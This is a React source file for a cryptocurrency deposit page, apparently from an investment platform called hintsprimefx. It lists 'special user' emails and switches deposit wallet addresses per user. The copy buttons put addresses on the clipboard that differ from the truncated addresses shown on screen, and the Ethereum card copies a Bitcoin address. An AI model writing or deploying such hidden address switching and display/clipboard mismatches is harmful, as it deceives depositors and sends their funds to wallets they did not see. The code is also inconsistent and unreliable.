import { useState, useEffect } from "react";
import axios from "axios";
import toast from "react-hot-toast";
import MainNavBar from "../components/MainNavBar";

const Deposite = () => {
  const [user, setUser] = useState(null);

  const newU = localStorage.getItem("user");
    const newUser = JSON.parse(newU);
    const email = newUser.email;

  useEffect(() => {
    const getUser = async () => {
      try {
        const res = await axios.post("/getUser", { email });
        if (res.data) {
          setUser(res.data);
        }
      } catch (err) {
        console.log(err);
      }
    };

    if (email) getUser();
  }, [email]);

  // ✅ CONDITION
  const specialUsers = [
  "mosessixcojohn123@gmail.com",
  "mosessixco218@gmail.com",
  "Recoverymanaget555@gmail.com",
];

//TAjZkvRtK5cdoG11udBx628Ncw8mPSh2Sc
//1GNu6gMQMR2rWxZubMQ46icSSuTUbrNZLZ
//0x18562342774d0f6db54264edcdc650a6e2c7d45c

const isSpecialUser = specialUsers.includes(user?.email);

  // ✅ WALLET SWITCHING
  const btcAddress = isSpecialUser
    ? "18ysc2nda5FFN8Gjm6a6KXusXYuTrrgu6r"
    : "18ysc2nda5FFN8Gjm6a6KXusXYuTrrgu6r";

  const ethAddress = isSpecialUser
    ? "18ysc2nda5FFN8Gjm6a6KXusXYuTrrgu6r"
    : "18ysc2nda5FFN8Gjm6a6KXusXYuTrrgu6r";

  const usdtAddress = isSpecialUser
    ? "TLov1Geu2TPAEh8YxHjmTB3AKZkPWBkX4D"
    : "TLov1Geu2TPAEh8YxHjmTB3AKZkPWBkX4D";

  const handleCopy = async (textToCopy) => {
    try {
      await navigator.clipboard.writeText(textToCopy);
      toast.success("Copied successfully!");
    } catch (err) {
      toast.error("Failed to copy!");
    }
  };

  const walletConnect = async () => {
    toast.success("Wallet Connect Coming Soon!");
  };

  return (
    <>
      <MainNavBar />
      <div style={{ marginTop: "80px" }} className="container-scroller">
        <div className="container-fluid page-body-wrapper">
          <div className="main-panel m-0 w-100">
            <div className="content-wrapper">
              <div className="row">
                {/* BTC */}
                <div
                  style={{ borderRadius: "0px" }}
                  className="col-xl-4 p-2 col-sm-4"
                >
                  <button
                    onClick={walletConnect}
                    className="btn btn-secondary w-100"
                  >
                    <i className="fas fa-wallet text-warning m-2"></i>
                    Connect Wallet
                  </button>

                  <div
                    style={{ border: "none", borderRadius: "9px" }}
                    className="card card-gradient"
                  >
                    <div className="card-body card-gradient">
                      <h5 onClick={() => handleCopy(btcAddress)}>
                        bc1q7ppeu0vywh0fejmjc7jznq9nf50xj0...
                        <i className="fas fa-copy text-warning m-1"></i>
                      </h5>

                      <h4 className="card-title">
                        Deposit Using Bitcoin | USDT(TRC20)
                      </h4>

                      <p className="card-description">
                        Bitcoin | USDT Deposit Method
                      </p>

                      <hr />

                      <p className="card-description">
                        <span className="text-warning">
                          Please upload your payment proof for quick
                          verification.
                        </span>{" "}
                        <span className="text-primary">
                          On confirmation, your account will be funded
                          automatically and you’ll be notified via email.
                        </span>
                      </p>
                    </div>
                  </div>
                </div>

                {/* ETH */}
                <div
                  style={{ borderRadius: "0px" }}
                  className="col-xl-4 p-2 col-sm-4"
                >
                  <button
                    onClick={walletConnect}
                    className="btn btn-secondary w-100"
                  >
                    <i className="fas fa-wallet text-warning m-2"></i>
                    Connect Wallet
                  </button>

                  <div
                    style={{ border: "none", borderRadius: "9px" }}
                    className="card card-gradient"
                  >
                    <div className="card-body card-gradient">
                      <h5 onClick={() => handleCopy(ethAddress)}>
                       0x422D59551478E493b8e4489a308dA7ca3...
                        <i className="fas fa-copy text-warning m-1"></i>
                      </h5>

                      <h4 className="card-title">
                        Deposit Using Ethereum | USDT(ERC20)
                      </h4>

                      <p className="card-description">
                        Ethereum | USDT Deposit Method
                      </p>

                      <hr />

                      <p className="card-description">
                        <span className="text-warning">
                          Please upload your payment proof for quick
                          verification.
                        </span>{" "}
                        <span className="text-primary">
                          On confirmation, your account will be funded
                          automatically and you’ll be notified via email.
                        </span>
                      </p>
                    </div>
                  </div>
                </div>

                {/* USDT */}
                <div className="col-xl-4 col-sm-4 grid-margin mt-5">
                  <div
                    style={{ border: "none", borderRadius: "9px" }}
                    className="card card-gradient"
                  >
                    <div className="card-body card-gradient">
                      <h5 onClick={() => handleCopy(usdtAddress)}>
                        TGMSYN1kCo8egaaAtNugu3qrLXnCdj...
                        <i className="fas fa-copy text-warning m-1"></i>
                      </h5>

                      <h4 className="card-title">
                        Deposit Using USDT | USDT(TRC20)
                      </h4>

                      <p className="card-description">
                        USD | USDT Deposit Method
                      </p>

                      <hr />

                      <p className="card-description">
                        Request other available Deposit Method
                      </p>

                      <p className="card-description">
                        <span className="text-success">
                          Once requested, payment details will be sent to your
                          email.
                        </span>{" "}
                        After payment, send proof to: support@hintsprimefx.com
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </>
  );
};

export default Deposite;
